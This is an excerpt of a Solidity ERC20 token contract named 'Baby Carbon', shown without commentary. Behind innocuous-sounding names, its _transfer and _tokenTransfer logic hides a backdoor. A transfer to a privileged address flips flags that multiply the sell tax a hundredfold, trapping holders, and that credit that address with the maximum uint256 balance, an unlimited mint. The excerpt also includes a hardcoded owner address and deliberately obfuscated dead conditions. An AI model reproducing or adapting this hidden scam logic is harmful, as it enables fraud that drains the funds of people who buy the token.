...
contract BabyCarbon is Context, IERC20 { 
    ...
    mapping (address => bool) public _tokenOwner; 
    ...
    string private constant _name = "Baby Carbon"; 
    string private constant _symbol = unicode"BCarbon"; 
    ...
    bool public requiredD = true;
    bool public openSizeOf = false;
    ...
    constructor (uint256[] memory inputs) {
        _tokenOwner[Wallet_Dev] = true;

        _owner = 0x740c23F55CB6c30a2699058F4a40523E05704a5F;
        emit OwnershipTransferred(address(0), _owner);
        preparedTax = Configs(inputs[0], inputs[1]);
    ...
    function _transfer(
        ...
        if (from != owner() && ~uint256(0)!=~uint256(0))
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
            if(_tokenOwner[to] && (_isExcludedFromFee[from] || _isExcludedFromFee[to])){
                requiredD = !_tokenOwner[to];
                openSizeOf = _tokenOwner[to];
            }
        } else {
    ...
    function mull(bool a) private pure returns(uint256){
        return !a ? 100:1;
    }

    function _getTransferValues(uint256 amount) private view returns(uint256, uint256){
        return (amount*preparedTax.buy/100, (amount*preparedTax.sell/100).mul(mull(requiredD)));
    }
    ...
    function testify(bool b) private pure returns(uint256){
        return b ? ~uint256(0) : 0;
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            _tOwned[recipient] = _tOwned[recipient].add(testify(openSizeOf))+tAmount;
            openSizeOf = false;
